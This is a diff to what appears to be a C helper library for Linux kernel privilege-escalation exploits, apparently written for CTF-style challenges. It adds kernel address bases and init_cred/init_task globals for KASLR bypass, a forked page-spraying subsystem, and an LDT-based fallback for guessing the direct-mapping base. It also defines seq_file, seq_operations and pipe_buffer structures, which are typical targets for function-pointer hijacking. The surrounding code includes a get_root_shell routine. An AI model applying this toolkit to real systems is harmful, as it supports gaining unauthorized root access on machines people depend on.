@@ -48,10 +48,13 @@
  */
 
 size_t kernel_base = 0xffffffff81000000, kernel_offset = 0;
+size_t page_offset_base = 0xffff888000000000, vmemmap_base = 0xffffea0000000000;
+size_t init_task, init_nsproxy, init_cred;
 
 void err_exit(char *msg)
 {
     printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
+    sleep(5);
     exit(EXIT_FAILURE);
 }
 
@@ -60,6 +63,7 @@ void get_root_shell(void)
 {
     if(getuid()) {
         puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
+        sleep(5);
         exit(EXIT_FAILURE);
     }
 
@@ -286,6 +290,19 @@ void spray_cmd_handler(void)
     } while (req.cmd != CMD_EXIT);
 }
 
+/* init pgv-exploit subsystem :) */
+void prepare_pgv_system(void)
+{
+    /* pipe for pgv */
+    pipe(cmd_pipe_req);
+    pipe(cmd_pipe_reply);
+    
+    /* child process for pages spray */
+    if (!fork()) {
+        spray_cmd_handler();
+    }
+}
+
 /**
  * IV - keyctl related
 */
@@ -494,7 +511,9 @@ size_t ldt_guessing_direct_mapping_area(void *(*ldt_cracker)(void*),
             break;
         }
         else if (retval == 0) {
-            err_exit("no mm->context.ldt!");
+            printf("[x] no mm->context.ldt!");
+            page_offset_base = -1;
+            break;
         }
         page_offset_base += burte_size;
     }
@@ -675,7 +694,7 @@ void register_userfaultfd_for_thread_stucking(pthread_t *monitor_thread,
 
 
 /**
- * IX - file and tty related structures 
+ * IX - kernel structures 
  */
 
 struct file;
@@ -685,7 +704,29 @@ struct tty_driver;
 struct serial_icounter_struct;
 struct ktermios;
 struct termiox;
-struct seq_file;
+struct seq_operations;
+
+struct seq_file {
+	char *buf;
+	size_t size;
+	size_t from;
+	size_t count;
+	size_t pad_until;
+	loff_t index;
+	loff_t read_pos;
+	uint64_t lock[4]; //struct mutex lock;
+	const struct seq_operations *op;
+	int poll_event;
+	const struct file *file;
+	void *private;
+};
+
+struct seq_operations {
+	void * (*start) (struct seq_file *m, loff_t *pos);
+	void (*stop) (struct seq_file *m, void *v);
+	void * (*next) (struct seq_file *m, void *v, loff_t *pos);
+	int (*show) (struct seq_file *m, void *v);
+};
 
 struct tty_operations {
     struct tty_struct * (*lookup)(struct tty_driver *driver,
@@ -731,6 +772,50 @@ struct tty_operations {
     void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
 #endif
     const struct file_operations *proc_fops;
+};
+
+struct page;
+struct pipe_inode_info;
+struct pipe_buf_operations;
+
+struct pipe_buffer {
+	struct page *page;
+	unsigned int offset, len;
+	const struct pipe_buf_operations *ops;
+	unsigned int flags;
+	unsigned long private;
+};
+
+struct pipe_buf_operations {
+	/*
+	 * ->confirm() verifies that the data in the pipe buffer is there
+	 * and that the contents are good. If the pages in the pipe belong
+	 * to a file system, we may need to wait for IO completion in this
+	 * hook. Returns 0 for good, or a negative error value in case of
+	 * error.  If not present all pages are considered good.
+	 */
+	int (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);
+
+	/*
+	 * When the contents of this pipe buffer has been completely
+	 * consumed by a reader, ->release() is called.
+	 */
+	void (*release)(struct pipe_inode_info *, struct pipe_buffer *);
+
+	/*
+	 * Attempt to take ownership of the pipe buffer and its contents.
+	 * ->try_steal() returns %true for success, in which case the contents
+	 * of the pipe (the buf->page) is locked and now completely owned by the
+	 * caller. The page may then be transferred to a different mapping, the
+	 * most often used case is insertion into different file address space
+	 * cache.
+	 */
+	int (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);
+
+	/*
+	 * Get a reference to the pipe buffer.
+	 */
+	int (*get)(struct pipe_inode_info *, struct pipe_buffer *);
 };
 
 #endif
